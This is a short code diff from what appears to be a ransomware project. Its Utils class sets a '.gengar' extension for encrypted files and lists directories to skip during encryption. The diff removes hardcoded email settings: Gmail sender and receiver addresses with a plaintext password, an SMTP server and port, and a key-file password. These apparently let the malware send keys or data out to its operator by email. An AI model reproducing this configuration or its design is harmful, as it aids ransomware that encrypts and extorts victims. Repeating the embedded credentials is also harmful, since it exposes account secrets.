@@ -25,15 +25,6 @@ class Utils:
     BRAND_EXT = '.gengar'
 
 
-    # mail variables
-    SENDER = 'teamcyber541@gmail.com'
-    SENDER_PASSWORD = 'new_password100'
-    RECEIVER = 'teamcyber5412@gmail.com'
-    MAIL_SERVER = 'smtp.gmail.com'
-    MAIL_PORT = 587
-    KEY_PASSWORD = 'key_FILE_passw0rd!'
-
-
     # directories that must avoid from encrypting
     PROTECTED_DIRS = ['Content.IE5',
                       'Temporary Internet Files',
